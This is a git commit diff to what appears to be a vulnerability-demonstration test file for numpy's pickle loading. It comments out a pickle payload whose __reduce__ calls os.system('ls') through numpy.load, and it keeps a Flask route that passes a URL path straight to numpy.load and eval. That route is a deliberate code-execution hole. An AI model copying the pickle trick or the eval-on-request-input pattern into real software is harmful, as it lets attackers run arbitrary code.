a25b413499342d2f5d16236701b3eb850ba80db9
ngjiekang <64952428+ngjiekang@users.noreply.github.com>
2024-02-22 23:04:37 +0800

    Update test_numpy_load_vul.py

--- numpy/tests/test_numpy_load_vul.py
+++ numpy/tests/test_numpy_load_vul.py
@@ -2,23 +2,23 @@ import numpy
 #from numpy import __version__
 #print __version__
 import os
-import  pickle
+import pickle
 
-class Test(object):
-    def __init__(self):
-        self.a = 1
+# class Test(object):
+#     def __init__(self):
+#         self.a = 1
 
-def __reduce__(self):
-    return (os.system,(&#39;ls&#39;,))
+# def __reduce__(self):
+#     return (os.system,(&#39;ls&#39;,))
 
-tmpdaa = Test()
-with open("a-file.pickle",'wb') as f:
-    pickle.dump(tmpdaa,f)
-numpy.load('a-file.pickle')
+# tmpdaa = Test()
+# with open("a-file.pickle",'wb') as f:
+#     pickle.dump(tmpdaa,f)
+# numpy.load('a-file.pickle')
 
 from flask import Flask, request
 app = Flask(__name__)
 @app.route("/files/<path>")
 def analyze_file(path):
-  numpy.load(path)
-  eval(path)
+    numpy.load(path)
+    eval(path)
